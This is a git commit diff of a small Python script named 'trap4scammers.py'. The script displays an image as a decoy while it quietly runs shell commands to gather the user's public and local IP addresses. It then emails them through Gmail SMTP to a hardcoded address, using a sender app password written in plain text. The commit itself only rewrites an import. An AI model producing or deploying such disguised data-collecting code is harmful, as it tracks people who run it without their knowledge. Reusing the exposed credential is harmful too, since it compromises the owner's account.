1521c1812382509834cfc781e395a16302706f7d
Valerii Syroiezhin <86792918+syroiezhin@users.noreply.github.com>
2022-08-02 04:23:53 +0300

    update

--- trap4scammers.py
+++ trap4scammers.py
@@ -1,9 +1,8 @@
 from os import popen
 from PIL import Image
-import email_to
+from email_to import Message, EmailServer
 
 def shape():
-
   try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
   except: myhtml = "ERROR :("
   finally:
@@ -11,7 +10,7 @@ def shape():
     destination = "svaller22@gmail.com"
     
     # create a password for the app bot and get the password by putting it in brackets : https://myaccount.google.com/apppasswords
-    email_to.EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(email_to.Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")
+    EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")
 
 if __name__ == "__main__": 
   Image.open("image.jpeg").show()
